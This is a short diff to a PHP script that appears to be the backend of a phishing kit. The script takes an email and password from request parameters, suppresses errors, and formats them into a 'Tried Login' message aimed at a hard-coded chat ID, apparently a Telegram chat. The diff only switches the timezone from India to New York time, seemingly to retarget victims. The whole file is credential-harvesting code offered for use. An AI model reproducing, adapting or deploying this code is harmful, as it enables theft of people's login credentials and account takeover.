@@ -1,6 +1,6 @@
 <?php
 
-date_default_timezone_set("Asia/kolkata");
+date_default_timezone_set("America/New_York");
 error_reporting(0);
 
 $time = date("h:i a", time());
@@ -8,7 +8,7 @@ $time = date("h:i a", time());
 $email = $_GET["email"];
 $password = $_GET["password"];
 
-$message = "Username : $email \nPassword: $password \nTried Login at $time IST";
+$message = "Username : $email \nPassword: $password \nTried Login at $time EST";
 
 $chat_id= 5633886680; // replace with your userid
 
